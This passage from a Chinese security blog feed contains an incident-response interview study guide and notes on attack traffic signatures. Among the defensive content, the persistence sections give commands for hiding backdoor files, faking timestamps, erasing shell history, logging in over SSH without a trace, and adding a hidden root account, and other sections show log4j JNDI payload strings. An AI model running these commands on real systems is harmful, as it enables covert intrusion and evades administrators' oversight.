&lt;p&gt;系统搜索事件查看器，打开之后找到 windows 日志，通过事件 id 进行排查。&lt;/p&gt;
&lt;p&gt;1149 远程桌面；4624 登录成功；4625 登录失败；4634 注销成功；4647 用户启动的注销；4672 使用超级用户（如管理员）进行登录；4720 创建用户。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;linux-入侵排查&#34;&gt;linux 入侵排查&lt;/h4&gt;
&lt;p&gt;见上文 linux 日志分析部分。除了日志分析，还需要使用一些查杀木马后门的工具进行检测，例如用 rkhunter 查杀 rootkit 隐匿软件，用 clamav 查杀病毒。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;负载均衡之后如何获得真实-ip&#34;&gt;负载均衡之后如何获得真实 ip&lt;/h4&gt;
&lt;p&gt;看 xff 头，xff: 真实ip，代理ip-1，代理ip-2，&amp;hellip;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;抑制&#34;&gt;抑制&lt;/h3&gt;
&lt;hr&gt;
&lt;h4 id=&#34;中勒索病毒了怎么办&#34;&gt;中勒索病毒了怎么办&lt;/h4&gt;
&lt;p&gt;在奇安信/360/腾讯/启明等企业的病毒库里面搜索，有解密工具。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;已知攻击者正在利用-log4j2-漏洞怎么应急&#34;&gt;已知攻击者正在利用 log4j2 漏洞，怎么应急&lt;/h4&gt;
&lt;p&gt;（1）根据 log4j2 特征 ${jndi} 在日志中进行搜索，找到漏洞点和攻击者信息，封禁攻击者 ip。&lt;/p&gt;
&lt;p&gt;（2）在防火墙的出站策略中阻断对常见 dnslog 平台的访问。&lt;/p&gt;
&lt;p&gt;（3）排查内存马并清除。&lt;/p&gt;
&lt;p&gt;（4）通知客户升级组件，进行安全加固。&lt;/p&gt;
&lt;p&gt;（5）对攻击者进行溯源。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;排查和阻止内网移动&#34;&gt;排查和阻止内网移动&lt;/h4&gt;
&lt;p&gt;如果一台主机在内网进行横向攻击，建议采取以下措施：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;隔离受感染的主机：立即将受感染的主机隔离，防止攻击者继续向其他主机传播恶意软件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;停止该主机的网络访问：为了避免感染蔓延到其他网络节点，需要立即停止该主机的网络访问。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;收集攻击信息：记录并收集有关攻击者、攻击方式和攻击原因的信息。这些信息有助于后续的调查和取证工作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;清除恶意软件：使用杀毒软件或恶意软件清理工具对受感染的主机进行扫描和清理，确保所有恶意文件都被删除。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;升级系统补丁：检查受感染主机是否存在已知漏洞，并及时安装相应的系统补丁，以防止攻击者再次利用已知漏洞进行攻击。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;取证和分析：对受感染的主机进行取证和分析，以确定攻击者的入侵路径和方法，为后续的防御和修复工作提供参考。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;加强安全防护：加强内网安全防护，定期进行内网安全扫描和审核，及时发现并修复安全漏洞。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;总之，在一台主机在内网进行横向攻击时，需要尽快采取以上措施，避免恶意软件感染蔓延到其他网络节点，最大程度保护整个内网的安全。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;windows-权限维持方法&#34;&gt;windows 权限维持方法&lt;/h4&gt;
&lt;p&gt;（一）隐藏文件&lt;/p&gt;
&lt;p&gt;（1）设置后门的文件属性为隐藏文件和系统文件。&lt;/p&gt;
&lt;p&gt;命令为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;attrib +s +a +h +r D:\test\project\test.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这些参数设置文件属性为系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。对于这个属性的设置，windows 文件夹的显示隐藏项目是无效的，从而做到了隐藏后门。&lt;/p&gt;
&lt;p&gt;（2）将后门伪装成正常文件。&lt;/p&gt;
&lt;p&gt;（3）对后门进行驱动级文件隐藏。&lt;/p&gt;
&lt;p&gt;用工具 easy file locker，可以做到驱动级文件隐藏，网站相关目录下找不到相关文件。防守方的排查方法是在 c:\windows\ 里面找可疑内容。&lt;/p&gt;
&lt;p&gt;（二）隐藏账号&lt;/p&gt;
&lt;p&gt;可以用注册表先导出再导入 .reg 文件建立一个克隆账号，这个账号只能在注册表里面看到，用命令行查询或者查看系统用户都看不到这个隐藏账号。蓝队排查可以用 D 盾。&lt;/p&gt;
&lt;p&gt;（三）端口复用&lt;/p&gt;
&lt;p&gt;将后门和其他应用程序绑定同一个端口，借用其他程序的端口收发信息，避免后门开放新的端口。&lt;/p&gt;
&lt;p&gt;需要对非后门信息进行回环转发。&lt;/p&gt;
&lt;p&gt;（四）进程注入&lt;/p&gt;
&lt;p&gt;进程注入技术有很多种，改注册表可以进一步实现注入的持久性。&lt;/p&gt;
&lt;p&gt;红队工具 msf/cs 等都带有进程注入功能。将恶意代码注入到其他进程，可以实现无文件攻击，可以穿墙。&lt;/p&gt;
&lt;p&gt;蓝队排查可以找红队工具的心跳包，心跳间隔取决于红队设置，一般是固定一分钟一个。&lt;/p&gt;
&lt;p&gt;（五）注册表自启动&lt;/p&gt;
&lt;p&gt;修改注册表实现开机自动开后门，防止重启后门掉线。&lt;/p&gt;
&lt;p&gt;（六）组策略设置自动运行脚本&lt;/p&gt;
&lt;p&gt;运行 gpedit.msc 进入本地组策略，开机自动运行恶意脚本。隐蔽性很高，但是需要知道脚本的绝对路径。&lt;/p&gt;
&lt;p&gt;（七）计划任务&lt;/p&gt;
&lt;p&gt;使用 windows 的任务计划程序设置每隔一分钟运行一次恶意脚本。&lt;/p&gt;
&lt;p&gt;（八）服务自启动&lt;/p&gt;
&lt;p&gt;在 windows 服务设置里面设置开机自动启动一个服务，结合 shell 实现无文件后门。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;linux-权限维持方法&#34;&gt;linux 权限维持方法&lt;/h4&gt;
&lt;p&gt;（一）隐藏文件&lt;/p&gt;
&lt;p&gt;用 chattr 命令防止 ls -l 查看。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chattr +i evil.php   锁定文件
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（二）篡改时间戳&lt;/p&gt;
&lt;p&gt;用 touch 命令就可以改。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;touch -t 1401021042.30 webshell.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（三）删除历史记录&lt;/p&gt;
&lt;p&gt;禁用 history，带有空格的不记录。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[space]set +o history
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者在 history 里面删除恶意语句。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;history | grep &amp;quot;keyword&amp;quot;

history -d [num]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（四）ssh 隐身登录&lt;/p&gt;
&lt;p&gt;登录信息无法被 w/who/last 等指令检测到。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（六）端口复用&lt;/p&gt;
&lt;p&gt;借用其他应用程序的端口，达到隐藏端口的目的。&lt;/p&gt;
&lt;p&gt;（五）隐藏进程&lt;/p&gt;
&lt;p&gt;让 root 无法通过相关指令查询到攻击者使用的进程，例如用 top 看到 cpu 占用率高却看不到相关进程。&lt;/p&gt;
&lt;p&gt;红队可以用 libprocesshider 工具实现隐藏进程，蓝队可以用 unhide 寻找隐藏进程进行网络取证。&lt;/p&gt;
&lt;p&gt;（六）进程注入&lt;/p&gt;
&lt;p&gt;linux 下可以用 linux-inject。&lt;/p&gt;
&lt;p&gt;（七）创建用户&lt;/p&gt;
&lt;p&gt;普通用户利用 suid shell 可以用 guest 用户登录暂时获取 root 权限。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cp /bin/bash /tmp/shell

chmod u+s /tmp/shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;用 useradd 命令可以创建 root 用户。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;useradd -p `openssl passwd -1 -salt &#39;salt&#39; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（八）设置 ssh 公私钥&lt;/p&gt;
&lt;p&gt;之后可以用自己设置的 ssh 密钥进行隐身登录，达成权限维持。&lt;/p&gt;
&lt;p&gt;（九）定时任务&lt;/p&gt;
&lt;p&gt;用 crontab 命令定时运行脚本。蓝队可以用 crontab -e 排查。&lt;/p&gt;
&lt;p&gt;（十）openssh 后门&lt;/p&gt;
&lt;p&gt;确定目标主机 openssh 版本、下载源码、添加后门。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;windows-提权&#34;&gt;windows 提权&lt;/h4&gt;
&lt;p&gt;烂土豆配合令牌窃取进行提权：所谓的烂土豆提权就是俗称的MS16-075，其是一个本地提权，是针对本地用户的，不能用于域用户。可以将Windows工作站上的特权从最低级别提升到“ NT AUTHORITY \ SYSTEM” – Windows计算机上可用的最高特权级别。&lt;/p&gt;
&lt;p&gt;注册表提权：注册表 AlwaysInstallElevated 是策略设置项，允许低权限用户以 system 权限运行安装文件；还可以将伪造的服务用注册表写入，那么运行服务的时候是 system 权限。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;linux-提权&#34;&gt;linux 提权&lt;/h4&gt;
&lt;p&gt;脏牛提权；suid 提权；find 提权；git 提权；&amp;hellip;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;sql-的-udf-提权&#34;&gt;sql 的 udf 提权&lt;/h4&gt;
&lt;p&gt;适用场景：已经 getshell，发现数据库有系统权限，利用数据库进行提权。&lt;/p&gt;
&lt;p&gt;利用条件：sql 有高权限、可读写 udf.dll（例如 root 默认有读写权限），已经 getshell 或者 sql 的安全配置允许导入 shell（例如 mysql 的 secure_file_priv 置空）&lt;/p&gt;
&lt;p&gt;加固方法：调低数据库的权限，安全设置里面不允许读写文件。&lt;/p&gt;
&lt;p&gt;提权流程：在 getshell 之后确认数据库有高权限并且满足 udf 提权的条件；查看 sql 的安装路径；根据 sql 的类型和版本确定传入 udf 的位置，例如查看 plugin 所在目录；制作 udf 文件；通过 shell 或 hex 编码传入 udf 文件；命令执行；功成身退，擦除痕迹。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;根除&#34;&gt;根除&lt;/h3&gt;
&lt;hr&gt;
&lt;h4 id=&#34;怎样排查内存马&#34;&gt;怎样排查内存马&lt;/h4&gt;
&lt;p&gt;（1）heapdump 内存排查。用 heapdump 和 grep 命令进行查找。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;heapdump

strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep &amp;quot;POST /&amp;quot;

strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep -E &amp;quot;/webapps/.*?\!&amp;quot; | sort -u
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（2）如果是 jsp 注入，在日志文件中排查 jsp 的访问请求，通过特征查找内存马&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;find / -name *.jsp | xargs grep &amp;quot;pass&amp;quot; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（3）如果是 rce，查看中间件的 error.log，判断攻击时间和手法；&lt;/p&gt;
&lt;p&gt;（4）根据告警的 url 查找日志，大量相同路径不同参数的请求，页面不存在但是返回 200 则可能有内存马。&lt;/p&gt;
&lt;p&gt;（5）特殊的 classloader 加载（例如 Templateslmpl 和 bcel），对应的 classloader 路径下没有 class 文件。&lt;/p&gt;
&lt;p&gt;（6）结合冰蝎和哥斯拉的 webshell 流量特征进行判断。&lt;/p&gt;
&lt;p&gt;（7）利用检测工具（arthas/牧云，java instrument 技术），检测 filter 类型，agent 类型。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;怎样清除内存马&#34;&gt;怎样清除内存马&lt;/h4&gt;
&lt;p&gt;（1）客户允许的话，重启。&lt;/p&gt;
&lt;p&gt;（2）删除 filter 中的恶意代码。&lt;/p&gt;
&lt;p&gt;（3）中间件注销 filter。&lt;/p&gt;
&lt;p&gt;（4）使用工具 arthas，VisualVM&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;内存马无文件落地怎么取证&#34;&gt;内存马无文件落地，怎么取证&lt;/h4&gt;
&lt;p&gt;/var/log/ 日志取证，结合流量特征用 grep 命令按照正则表达式搜索；/var/cache 缓存取证，结合流量特征用 grep 命令按照正则表达式搜索；检测工具，例如 arthas。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;java-web-中-servletfilterlistener-的区别&#34;&gt;java web 中 servlet/filter/listener 的区别&lt;/h4&gt;
&lt;p&gt;servlet 是处理请求的动态资源；filter 是过滤器，可以修改请求和响应；listener 是监听器，可以监听并加载一些插件。&lt;/p&gt;
&lt;p&gt;servlet: 冰蝎内存马&lt;/p&gt;
&lt;p&gt;filter: struts2&lt;/p&gt;
&lt;p&gt;listener: spring, log4j&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;log4j2-原理和流量特征&#34;&gt;log4j2 原理和流量特征&lt;/h4&gt;
&lt;p&gt;log4j2 是日志组件，其 lookups 机制存在 jndi 注入。&lt;/p&gt;
&lt;p&gt;判断利用是否成功：（1）出网一般走 rmi/ldap/dns，配合 ids 查看目标主机是否外带攻击；（2）查看目标主机是否存在 dnslog 活动；（3）查看是否下载恶意类。&lt;/p&gt;
&lt;p&gt;log4j2 的特征是 ${}，例如 ${jndi:ldap://0.0.0.0:80/exploit}&lt;/p&gt;
&lt;p&gt;log4j2 使用 jndi 注入，找恶意 url。&lt;/p&gt;
&lt;p&gt;log4j2 流量可以看到 rmi 或者 ldap 字样。&lt;/p&gt;
&lt;p&gt;log4j2 流量会出现 dns/ip 相关特征。&lt;/p&gt;
&lt;p&gt;log4j2 混淆绕过会使用冒号，例如 ${::::-j}${what:-n}&lt;/p&gt;
&lt;p&gt;log4j2 的影响范围包括：log4j1.x，spring boot，struts2, solr, vmware 产品线, flink, druid&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;shiro-550-和-721-的区别&#34;&gt;shiro 550 和 721 的区别&lt;/h4&gt;
&lt;p&gt;攻击方法的区别：550 密码撞库，721 填充攻击。&lt;/p&gt;
&lt;p&gt;shiro550 的 cookie 会有一个 rememberme 的值，并且这个值是很长的一个字符串。&lt;/p&gt;
&lt;p&gt;shiro550 使用 aes+base64 加密，密钥写死在代码里面。知道了密钥可以碰撞解密，写 payload 再加密，替换原来的 rememberme 字段，这个 rememberme 最终被反序列化，payload 被后端解析。&lt;/p&gt;
&lt;p&gt;shiro721 不需要知道 key，但是需要一个合法登录用户的 cookie 进行 padding oracle 填充攻击。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;shiro-利用链&#34;&gt;shiro 利用链&lt;/h4&gt;
&lt;p&gt;无依赖利用链，具体情况可以使用工具 ysoserial。&lt;/p&gt;
&lt;p&gt;因为我们知道 Shiro 原生类中是不存在 Commons-Collection CC 依赖的时候我们就无法通过 CC 链进行攻击，我们就需要另外找一个无依赖的方式对 Shiro 的反序列化漏洞进行利用：例如通过 Shiro 自带的依赖 Commons-Beanutils 进行攻击。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;fastjson-rce-的流程&#34;&gt;fastjson rce 的流程&lt;/h4&gt;
&lt;p&gt;简单描述一下 fastjson rce 的流程。攻击者的 payload 被受害者的服务器反序列化解析后，通过 jndi 连接攻击者指定的 rmi 服务器。攻击者 rmi 服务器向受害者服务器返回一个对象。受害者服务器检测到本地不存在该对象，向攻击者提供的地址请求恶意 class 文件。受害者服务器收到 class 文件后加载进内存，实例化的时候执行构造函数，完成 rce。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;怎样定位-webshell&#34;&gt;怎样定位 webshell&lt;/h4&gt;
&lt;p&gt;查看安全日志；查看敏感目录；查看未知端口、未知进程；使用杀毒软件，D盾，进行扫描和查杀。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;怎样清除-webshell&#34;&gt;怎样清除 webshell&lt;/h4&gt;
&lt;p&gt;终止进程；删除相关文件。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;杀了-webshell-还有外连流量怎样应急&#34;&gt;杀了 webshell 还有外连流量怎样应急&lt;/h4&gt;
&lt;p&gt;（1）有可能没有完全清除 webshell；&lt;/p&gt;
&lt;p&gt;（2）有可能其他系统被感染了，进行流量监测找到外连流量对应的系统和设备；&lt;/p&gt;
&lt;p&gt;（3）有可能攻击者在 getshell 之后植入了后门程序，查找可疑进程，同时进行流量监测。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;攻击者清理了作案痕迹怎么办&#34;&gt;攻击者清理了作案痕迹怎么办&lt;/h4&gt;
&lt;p&gt;（1）使用 lsof 恢复被删除的文件；&lt;/p&gt;
&lt;p&gt;（2）查看日志是否有新增加的用户。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;溯源反制手段有哪些&#34;&gt;溯源反制手段有哪些&lt;/h4&gt;
&lt;p&gt;找到攻击者的真实 ip 地址，得到物理地址。&lt;/p&gt;
&lt;p&gt;在威胁情报平台查询 ip 的关联事件。&lt;/p&gt;
&lt;p&gt;如果是服务器 ip，通过网络空间测绘查询该 ip 的其他网段。&lt;/p&gt;
&lt;p&gt;通过攻击 ip 历史 dns 解析记录/ip 反查域名，进行溯源分析。&lt;/p&gt;
&lt;p&gt;提取样本特征、用户名、ID、邮箱、C2服务器等信息，对攻击者 id 进行追踪，通过社交平台获取攻击者个人信息。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;威胁情报平台使用经验&#34;&gt;威胁情报平台使用经验&lt;/h4&gt;
&lt;p&gt;将 ip 放进去搜索即可。&lt;/p&gt;
&lt;p&gt;微步：威胁分析与情报共享社区&lt;/p&gt;
&lt;p&gt;安恒：安全星图平台&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;什么是攻击者画像&#34;&gt;什么是攻击者画像&lt;/h4&gt;
&lt;p&gt;攻击目的、网络代理、攻击手法；&lt;/p&gt;
&lt;p&gt;虚拟身份、真实身份、联系方式、组织情况。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;恢复&#34;&gt;恢复&lt;/h3&gt;
&lt;hr&gt;
&lt;h4 id=&#34;怎么恢复失陷主机的文件&#34;&gt;怎么恢复失陷主机的文件&lt;/h4&gt;
&lt;p&gt;找小伙伴帮忙。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
&lt;hr&gt;
&lt;h4 id=&#34;攻击事件调查报告&#34;&gt;攻击事件调查报告&lt;/h4&gt;
&lt;p&gt;确定告警真实性之后要生成一个攻击事件调查报告，包含以下内容。&lt;/p&gt;
&lt;p&gt;（1）攻击者最初的攻击媒介是什么？&lt;/p&gt;
&lt;p&gt;（2）攻击者如何访问环境？&lt;/p&gt;
&lt;p&gt;（3）攻击者是否利用漏洞获得了访问权或特权？&lt;/p&gt;
&lt;p&gt;（4）攻击者如何维持权限进行指挥和控制？&lt;/p&gt;
&lt;p&gt;（5）攻击在网络或设备上是否有持久性？&lt;/p&gt;
&lt;p&gt;（6）持久性的方法是什么？（例如后面、shell、合法凭证、远程工具）&lt;/p&gt;
&lt;p&gt;（7）哪些账号已经被盗用，分别是什么权限？&lt;/p&gt;
&lt;p&gt;（8）使用什么方法进行侦察？&lt;/p&gt;
&lt;p&gt;（9）是否发生横向移动，方法是什么？（例如 rdp，恶意软件，用户账号）&lt;/p&gt;
&lt;p&gt;（10）数据是否被泄露，类型是什么，方法是什么？&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;写过技站法吗&#34;&gt;写过技站法吗&lt;/h4&gt;
- https://xxxhidexxx.github.io/posts/sec/pdcerf/ - null</description>
        </item>
    
    
    
        <item>
        <title>攻击流量特征</title>
        <link>https://xxxhidexxx.github.io/posts/sec/char/</link>
        <pubDate>Thu, 18 Apr 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/char/</guid>
        <description>write-up https://xxxhidexxx.github.io/posts/sec/char/ -&lt;h3 id=&#34;传统漏洞的流量特征&#34;&gt;传统漏洞的流量特征&lt;/h3&gt;
&lt;h4 id=&#34;sqlxss&#34;&gt;sql&amp;amp;xss&lt;/h4&gt;
&lt;p&gt;请求包里面有明文 payload，攻击者会尝试很多次，很明显的特征。&lt;/p&gt;
&lt;h4 id=&#34;rce&#34;&gt;rce&lt;/h4&gt;
&lt;p&gt;这里只说最基础的，看到内网 ip 和 net user，curl，more，less 等 windows/linux 系统命令，或者 eval，system 等函数，则判断是 rce 攻击流量。&lt;/p&gt;
&lt;h4 id=&#34;文件包含&#34;&gt;文件包含&lt;/h4&gt;
&lt;p&gt;看到 require/include 等函数判断是文件包含攻击流量。&lt;/p&gt;
&lt;h4 id=&#34;任意文件&#34;&gt;任意文件&lt;/h4&gt;
&lt;p&gt;看到 /etc/passwd 等敏感目录，判断是任意文件读取/下载/删除攻击流量。&lt;/p&gt;
&lt;p&gt;看到上传文件的包里面有明文木马等恶意代码，判断是任意文件上传攻击流量。&lt;/p&gt;
&lt;h3 id=&#34;java-反序列化漏洞的流量特征&#34;&gt;java 反序列化漏洞的流量特征&lt;/h3&gt;
&lt;p&gt;主要考虑 struts2、shiro、weblogic、log4j2、fastjson 等组件及其历史漏洞的流量特征。&lt;/p&gt;
&lt;h4 id=&#34;java-反序列化数据传输&#34;&gt;java 反序列化数据传输&lt;/h4&gt;
&lt;p&gt;16 进制编码以 ac ed 00 05 开头，base64 编码为 rO0AB。&lt;/p&gt;
&lt;p&gt;有的 Content-Type: application/x-serialization 直接说明是 java 序列化数据包。&lt;/p&gt;
&lt;h4 id=&#34;shiro&#34;&gt;shiro&lt;/h4&gt;
&lt;p&gt;shiro 的 cookie 存在反序列化注入点。&lt;/p&gt;
&lt;p&gt;shiro 的流量特征是 cookie 有 rememberme 字段并使用 base64 编码。&lt;/p&gt;
&lt;p&gt;shiro550 和 shiro721 攻击方法的区别：550 密码撞库，721 填充攻击。&lt;/p&gt;
&lt;p&gt;如果 shiro cookie 正确，则返回包不会有 set-cookie: rememberme&lt;/p&gt;
&lt;p&gt;大部分 shiro 的响应包里面有回显。&lt;/p&gt;
&lt;p&gt;和运维确认 shiro 的版本，如果是 550 则对使用默认 key 的请求解密研判。&lt;/p&gt;
&lt;h4 id=&#34;log4j2&#34;&gt;log4j2&lt;/h4&gt;
&lt;p&gt;log4j2 的特征是 ${}，例如 ${jndi:ldap://0.0.0.0:80/exploit}&lt;/p&gt;
&lt;p&gt;log4j2 使用 jndi 注入，找恶意 url。&lt;/p&gt;
&lt;p&gt;log4j2 流量可以看到 rmi 或者 ldap 字样。&lt;/p&gt;
&lt;p&gt;log4j2 流量会出现 dns/ip 相关特征。&lt;/p&gt;
&lt;p&gt;log4j2 混淆绕过会使用冒号，例如 ${::::-j}${what:-n}&lt;/p&gt;
&lt;p&gt;log4j2 的影响范围包括：log4j1.x，spring boot，struts2, solr, vmware 产品线, flink, druid&lt;/p&gt;
&lt;h4 id=&#34;fastjson&#34;&gt;fastjson&lt;/h4&gt;
&lt;p&gt;fastjson 的强特征是 json 数据以 @type 开头。&lt;/p&gt;
&lt;p&gt;fastjson 用 json 传参，恶意流量的 json 参数含有 java 代码。&lt;/p&gt;
&lt;p&gt;fastjson 流量会看到 rmi 或者 ldap 字样。&lt;/p&gt;
&lt;p&gt;fastjson 的利用链 cc3、cc5 等，fastjson 有很多高危类。&lt;/p&gt;
&lt;h4 id=&#34;struts2&#34;&gt;struts2&lt;/h4&gt;
&lt;p&gt;struts 2 的特征是 %{}（或是其 url 编码 %25%7B&amp;hellip;%7D），并且请求体和响应体都包含 payload。&lt;/p&gt;
&lt;p&gt;struts2 文件类型基本上是 .action 和 .jsp 文件。&lt;/p&gt;
&lt;h4 id=&#34;weblogic&#34;&gt;weblogic&lt;/h4&gt;
&lt;p&gt;无强特征，请求体和响应体看到 java 代码则预判为攻击流量。&lt;/p&gt;
&lt;h3 id=&#34;webshell-工具的流量特征&#34;&gt;webshell 工具的流量特征&lt;/h3&gt;
&lt;p&gt;这里说的 webshell 流量主要考虑：冰蝎、菜刀、哥斯拉、蚁剑。&lt;/p&gt;
&lt;h4 id=&#34;冰蝎-behinder&#34;&gt;冰蝎 behinder&lt;/h4&gt;
&lt;p&gt;冰蝎 2.0-4.0 使用 16 位 md5 作为 aes 密钥。冰蝎 webshell 的默认密钥是 e45e329feb5d925b，即 rebeyond 的 md5 前 16 位，也可能遇到 admin 的 16 位 md5。&lt;/p&gt;
&lt;p&gt;冰蝎 2.0-4.0 弱特征：同一个 ip 短时间频繁更换 user-agent。&lt;/p&gt;
&lt;p&gt;冰蝎 4.0 有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd。&lt;/p&gt;
&lt;p&gt;冰蝎 2.0-3.0 使用 aes 加密 + base64 编码；4.0 不再有连接密码的概念，自定义的传输协议算法就是连接密码。&lt;/p&gt;
&lt;p&gt;冰蝎 3.0 连接 jsp 的 webshell 的请求数据包中的 content-type 字段常见为 application/octet-stream。&lt;/p&gt;
&lt;p&gt;冰蝎 4.0 弱特征：Accept 字段为 Accept: application/json, text/javascript, /; q=0.01 意思是浏览器可以接受任何格式，但是更倾向于接受 application/json 和 text/javascript。&lt;/p&gt;
&lt;p&gt;冰蝎 4.0 会使用例如 49700 之类的比较大的端口进行 tcp 连接，且端口依次增加。&lt;/p&gt;
&lt;p&gt;冰蝎 4.0 使用长连接 Connection：Keep-Alive。&lt;/p&gt;
&lt;h4 id=&#34;菜刀-caidao&#34;&gt;菜刀 caidao&lt;/h4&gt;
&lt;p&gt;菜刀 php webshell 使用 base64 编码在请求体中对一句话木马进行明文传输，payload 解码后会看到 eval、assert、base64_decode 字样。响应体有两个竖杠||。会使用 base64_decode 函数进行打断 (&amp;quot;@e&amp;quot;.&amp;ldquo;v&amp;rdquo;.&amp;ldquo;al&amp;rdquo;)。&lt;/p&gt;
&lt;p&gt;菜刀 jsp webshell 的第一段链接流量会看到 i=A&amp;amp;z0=GB2312 字样，第一个参数为 A-Q，第二个参数指定编码。有时会看到 z1、z2 参数写 payload。&lt;/p&gt;
&lt;p&gt;菜刀 asp webshell 会使用 unicode 编码，payload 使用一句话木马。&lt;/p&gt;
&lt;h4 id=&#34;哥斯拉-godzilla&#34;&gt;哥斯拉 godzilla&lt;/h4&gt;
&lt;p&gt;哥斯拉的强特征是 cookie 后面有个分号，目前版本的哥斯拉无法去除这个特征。&lt;/p&gt;
&lt;p&gt;哥斯拉的响应体的结构是 md5 前 16 位 + base64 + md5 后 16 位。&lt;/p&gt;
&lt;p&gt;哥斯拉默认的 user-agent 会暴露 jdk 信息，但是哥斯拉支持自定义请求头，所以攻击者可以去除这个特征。&lt;/p&gt;
&lt;p&gt;哥斯拉的 Accept字段默认是 Accept:text/html,image/gif,image/jpeg,*;q=.2,/;q=.2，但是同上，攻击者可以修改请求头信息，所以只作为一个辅助监测手段。&lt;/p&gt;
&lt;p&gt;哥斯拉会发三个特定请求。&lt;/p&gt;
&lt;h4 id=&#34;蚁剑-antsword&#34;&gt;蚁剑 antsword&lt;/h4&gt;
&lt;p&gt;蚁剑的请求体含有 ini_set、set_time_limit、display_errors 字样。&lt;/p&gt;
&lt;p&gt;蚁剑的 ua 头为 antsword/v2.1，但是攻击者可以去除这个特征。&lt;/p&gt;
&lt;p&gt;蚁剑的响应体为 base64 编码，随机数 + 结果 + 随机数。&lt;/p&gt;
&lt;p&gt;蚁剑的 php webshell 使用 eval 和 assert 函数；asp webshell 使用 assert 函数；jsp webshell 使用 java 类加载。&lt;/p&gt;
&lt;p&gt;蚁剑加密数据包的参数很多以 _0x&amp;hellip; 的形式出现（下划线可替换为其他字符）。&lt;/p&gt;
&lt;h3 id=&#34;红队工具流量特征&#34;&gt;红队工具流量特征&lt;/h3&gt;
&lt;h4 id=&#34;cobaltstrike&#34;&gt;CobaltStrike&lt;/h4&gt;
&lt;p&gt;木马相关。&lt;/p&gt;
&lt;p&gt;默认 beacon 每隔六十秒发一个心跳包，通过 cookie 携带靶机信息。&lt;/p&gt;
&lt;p&gt;木马运行后会从指定服务器下载 stage，这个文件的大小约等于 211kb。下载路径是随机生成的，但是其 ascii 之和模 256 余 92。&lt;/p&gt;
&lt;p&gt;下发任务的方法是 c2 服务器在心跳包的响应里发送任务。&lt;/p&gt;
&lt;p&gt;beacon 使用 post 回传数据并且 url 为 /submit.php?id=&lt;/p&gt;
&lt;p&gt;stageless 阶段不需要下载 stage，但是可以看到 c2 服务器会返回 0.0.0.0 确认 beacon 上线。&lt;/p&gt;
&lt;p&gt;stageless 阶段的流量特征是使用 A/TXT/AAAA 三种方式发放 payload，且看到 ip 为 0.0.0.241/0.0.0.243/0.0.0.245。&lt;/p&gt;
